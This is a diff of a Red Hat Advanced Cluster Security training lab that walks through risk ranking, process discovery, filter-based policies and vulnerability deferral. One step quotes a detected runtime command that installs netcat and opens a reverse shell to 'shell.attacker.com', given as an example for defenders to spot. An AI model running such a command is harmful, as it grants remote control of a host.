@@ -10,13 +10,11 @@
 
 You are now acquainted with the detailed information that Red Hat^(R)^ Advanced Cluster Security for Kubernetes (RHACS) provides about vulnerabilities and workflows to manage individual vulnerabilities. Often, the number of vulnerabilities detected can seem daunting to those uninitiated in security practice. You need to bring runtime, security configuration management, and vulnerability all together to get a more precise view of what is going on in your clusters. You need a system to evaluate the potential risk of harm from these vulnerabilities, and you need a way of prioritizing vulnerabilities to be addressed and not just deferring them.
 
-You are now acquainted with the detailed information that Red Hat^(R)^ Advanced Cluster Security for Kubernetes (RHACS) provides about vulnerabilities and workflows to manage individual vulnerabilities. Often, the number of vulnerabilities detected can seem daunting to those uninitiated in security practice. You need to bring runtime, security configuration management, and vulnerability all together to get a more precise view of what is going on in your clusters. You need a system to evaluate the potential risk of harm from these vulnerabilities, and you need a way of prioritizing vulnerabilities to be addressed and not just deferring them.
+|====
+*RHACS understands the three major phases of an application's lifecycle to be _build_, _deploy_, and _runtime_.*
+|====
 
-RHACS understands the three major phases of an application's lifecycle to be _build_, _deploy_, and _runtime_.
-
-The risk evaluation functionality of RHACS is used to understand how deployment-time configuration and runtime activity impact the likelihood of exploits occurring and how successful those exploits may be.
-
-RHACS assesses risk across your entire environment and ranks your running deployments according to their security risk. It also details vulnerabilities, configurations, and runtime activities that require immediate attention. This helps you prioritize the remedial actions you plan to take.
+RHACS assesses risk across your entire environment and ranks your running deployments according to their security risk. It also details vulnerabilities, configurations, and runtime activities that require immediate attention. The risk evaluation functionality of RHACS is used to understand how deployment-time configuration and runtime activity impact the likelihood of exploits occurring and how successful those exploits may be. This helps you prioritize the remedial actions you plan to take.
 
 Realistically it is only possible to tackle some sources of risk, so organizations prioritize their efforts. RHACS helps to inform that prioritization.
 
@@ -28,40 +26,36 @@ In this section, you look at the complete view of the risks by deployments in al
 
 This list view shows all deployments in all clusters and namespaces, ordered by risk priority. A multi-factor risk metric sorts deployments based on policy violations, image contents, deployment configuration, and other similar factors. Deployments at the top of the list present the most risk.
 
-.Procedure
-. From the left navigation menu, select the *Risk* tab:
-
-image::04-risk-1.png[link=self, window=blank, width=100%]
-
 === View Single Deployment Details
 
 In this section, you examine the riskiest deployment to understand how risk is assessed during deploy time.
 
 .Procedure
+. From the left navigation menu, select the *Risk* tab:
+
+image::04-risk-1.png[link=self, window=blank, width=100%]
+
+[start=2]
 . Click the `visa-processor` deployment to bring up the *Risk Details* panel, with the *Risk Indicators* tab selected:
 
 image::04-risk-2.png[link=self, window=blank, width=100%]
 
 The *Risk Indicators* tab shows why this deployment is highly risky. The deployment has serious, fixable vulnerabilities, but it also has configurations such as network ports and service exposure outside the cluster, making it more likely to be attacked. In addition, other configurations, such as privileged containers, mean that a successful attacker has access to the underlying host network and file system, including other containers running on that host.
 
-IMPORTANT: 
-====
-As you scroll down think about what risk indicators are important to your organization? How would you work to mitigate that risk?
-====
-
-[start=2]
-. Navigate to the bottom of the *Risk Indicators* page and take a minute to review the *Components Useful for Attackers* section.
-
-IMPORTANT: 
 ====
 Why do you think the deployment is rated as the *"Riskiest deployment"*
 ====
+
+IMPORTANT: As you scroll down think about what risk indicators are important to your organization? How would you work to mitigate that risk?
+
+[start=3]
+. Navigate to the bottom of the *Risk Indicators* page and take a minute to review the *Components Useful for Attackers* section.
 
 All of these configurations are gleaned automatically by RHACS from OpenShift, and the built-in policies assign a risk score to each, meaning that this risk report is available as soon as you start running RHACS.
 
 And, hopefully, you can see why this image is highly insecure in the service configuration section, you can see that the sysadmin capabilities are added port 8080 is exposed in the cluster, and you can see that components useful for attackers are present components such as app bash curl and wget. This means a successful attacker gains complete control over this entire OpenShift^(R)^ cluster. 
 
-[start=3]
+[start=4]
 . Navigate to the deployment details
 
 image::04-risk-3.png[link=self, window=blank, width=100%]
@@ -70,7 +64,7 @@ Here we can see a complete breakdown of the deployment details including the con
 
 All of this information continues to add context to the container and how it's running in the cluster bumping up its risk factors.
 
-[start=4]
+[start=5]
 . Next, click on the *Process Discovery* Tab
 
 image::04-risk-4.png[link=self, window=blank, width=100%]
@@ -79,22 +73,23 @@ This tab shows you all of the running processes in the container. You can see th
 
 If you scroll to the bottomw of the page. you could add those processes to the baseline with the `+` sign and silence any future alerts. But typically we want to understand what our applications are doing before we enact any policy enfocement or exceptions.
 
-[start=5]
+[start=6]
 . Click the drop-down arrow next to `/bin/bash` to reveal the specific context that triggered this violation: `-c /usr/bin/sudo /usr/bin/apt-get -y install netcat; /usr/bin/sudo /bin/nc shell.attacker.com 9001 -e /bin/bash`.
 
 image::04-risk-5.png[link=self, window=blank, width=100%]
 
-IMPORTANT: 
 ====
 Does this command running in a container at runtime seem important?
 ====
 
+[start=7]
 . Click the *View Graph* in the header bar to call up the *Event Timeline*.
 
 image::04-risk-6.png[link=self, window=blank, width=100%]
 
 The event timeline shows for each pod the process activity that has occurred over time. It has the visa-processor and visa-processor-sidecar information in the interface.
 
+[start=8]
 . Click the squares or circles for the process activity:
 
 image::04-risk-7.png[link=self, window=blank, width=100%]
@@ -128,9 +123,9 @@ image::04-risk-10.png[link=self, window=blank, width=100%]
 . Go ahead and lock the baseline. All further processes run in this sidecar that is not among the several listed result in a triggered alert.
 . Click *X* to close the details panel.
 
-== Find vulnerabilities quickly with filters
+== Find and create policies quickly with filters
 
-In the Risk view and most UI pages, RHACS has a filter bar at the top that allows you to narrow the reporting view to matching or non-matching criteria. Almost all of the attributes that RHACS gathers are filterable. This is very useful in the Risk view when you know what you are looking for, for example, when you want answers to questions such as "What applications have CVE-2021-44228 present?"
+In the Risk view and most UI pages, RHACS has a filter bar at the top that allows you to narrow the reporting view to matching or non-matching criteria. Almost all of the attributes that RHACS gathers are filterable. This is very useful in the Risk view when you know what you are looking for, for example, when you want answers to questions such as "What applications have `bash` present?"
 
 .Procedure
 . Enter `Process Name` in the filter bar (where it reads `Add one or more resource filters`) and select the *Process Name* key.
@@ -140,7 +135,6 @@ image::04-risk-11.png[link=self, window=blank, width=100%]
 
 NOTE: Several deployments are shown to have run `bash` since they started--and all of them are in production. This could be a serious threat that we want to monitor.
 
-
 === Creating policies via filters
 
 You can create new security policies based on the filtering criteria that you select in the *Risk* dashboard. However, when you create new security policies from the *Risk* view based on the selected filtering criteria, not all requirements are directly applied to the new policy.
@@ -148,8 +142,7 @@ You can create new security policies based on the filtering criteria that you se
 RHACS transforms the filtering criteria into policy criteria by converting the cluster, namespace, and deployment filters to equivalent policy scopes.
 
 .Procedure
-. Head to the *Risk* dashboard
-. Add *Process Name* THEN *apt or apt-get or dpkg* to the search bar
+. From the Risk dashboard filter by *Process Name* THEN *apt or apt-get or dpkg* to the search bar
 . Next add  *Namespace* THEN default
 
 NOTE: What deployments did you expect to see?
@@ -160,7 +153,6 @@ image::05-policy-1.png[link=self, window=blank, width=100%]
 
 [start=5]
 . Give the policy all of the necessary information and complete the required fields then hit next.
-
 
 * *Name*: `No bash allowed`
 * *Severity*: `High`
@@ -198,55 +190,46 @@ See the link:https://docs.openshift.com/acs/4.4/operating/evaluate-security-risk
 
 == What would you do?
 
-What filters would be useful in your day-to-day risk workflow? 
-How would you scope your filters by team/application/cluster?
+* What filters would be useful in your day-to-day risk workflow? 
+* How would you scope your filters by team/application/cluster?
 
 Try some of these scopes yourself by indicating different namespaces in your filters.
 
-=== Risk Acceptance workflow (Needs work)
+=== Risk Acceptance workflow 
 
-As a security analyst who is a deferral approver, you can evaluate requested deferrals and respond to them through the RHACS portal.
+As a security analyst who is a deferral approver, you can evaluate requested deferrals and respond to them through the RHACS portal. In this section we will review a deferral process in RHACS.
 
-. Procedure
-. Navigate to *Vulnerability Management -> Risk Acceptance* and search for the from the previous example, CVE-2022-1292.
+.Procedure
+. Head to the Vulnerability Management (1.0) dashboard.
+. Click on the *quay.io/rhacs-misc/rce:1.0* image or the *riskiest image* whichever one you prefer.
+. Scroll down to *Image Findings*
 
-image::02_vuln_10.png[]
-
-[start=2]
-. Review the vulnerability's comments, scope, and action to decide if you want to approve it.
-. Click the three dots.
-
-image::options_menu_icon.png[]
-
-At the far right of the CVE, approve or deny the request for approval and provide a rationale.
-
-You can see your *Approved Deferrals* from the appropriate tab above and make changes.
-. You can also click through to the deployment that has that vulnerability and see its *Risk Priority*:
+image::04-risk-15.png[link=self, window=blank, width=100%]
 
 [start=4]
-. Next, Click `1 deployment`:
+. Select any vulnerability that you want to defer. Click the 3 dots on the right hand side of the tab and select defer.
+. Pick a timeline for deferral, and decide whether the vulnerability should be ignored in all images or only this one. 
+. Click "Request Approval"
 
-image::rhacs_vuln_deployment.png[RHACS 1 Deployment]
+image::04-risk-17.png[link=self, window=blank, width=100%]
 
-[start=5]
-. Click the `visa-processor` link to be taken to the *Deployment Overview*.
+image::04-risk-18.png[link=self, window=blank, width=100%]
 
-image::02_vuln_11.png[Risk Visa]
+|====
+You should see the small blue *i* in the dashboard. Click the i and paste the link in the Address Bar
+|====
 
-How is *Risk Priority* determined?
+image::04-risk-19.png[link=self, window=blank, width=100%]
+image::04-risk-20.png[link=self, window=blank, width=100%]
 
-That is the subject of the next lab, *Risk Management*
-
-== Report Vulnerabilities to Teams
-
-IMPORTANT: You cannot send reports in this training lab. It is not integrated with an email server without an email notifier.
-
-As organizations must constantly reassess and report on their vulnerabilities, some find it helpful to have scheduled communications with key stakeholders to help manage vulnerabilities.
-
-You can use RHACS to schedule these regular communications through email. Red Hat recommends that you scope these communications to the most relevant information that the key stakeholders need.
+The Risk Acceptance bar will show all pending approvals. This will be either false positives OR deferrals. While you can mute notifications or a CVE you can never hide them in RHACS. 
 
 == Summary
 
-In this lab, you became familiar with the power of RHACS. RHACS does not simply surface vulnerabilities. You learned the various risk priority justifications RHACS provides and filtered and searched through these vulnerabilities. RHACS reports the risk indicators, deployment details, and processes necessary to discover vulnerabilities for each deployment.
+image::https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExdDF4aHd5Mm4ycWlqN3k0cnpjMWVlbWd1a2l5YTFlbWd6YnN1eWoxZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l3q2tzon8OCC7BqmY/giphy.gif[link=self, window=blank, width=100%, class="center"]
 
-Great job!! Have fun with *Policy Management*!
+Great job!! 
+
+RHACS does not simply surface vulnerabilities. You learned the various risk priority justifications RHACS provides and filtered and searched through these vulnerabilities. RHACS reports the risk indicators, deployment details, and processes necessary to discover vulnerabilities for each deployment.
+
+Have fun with *Policy Management*!
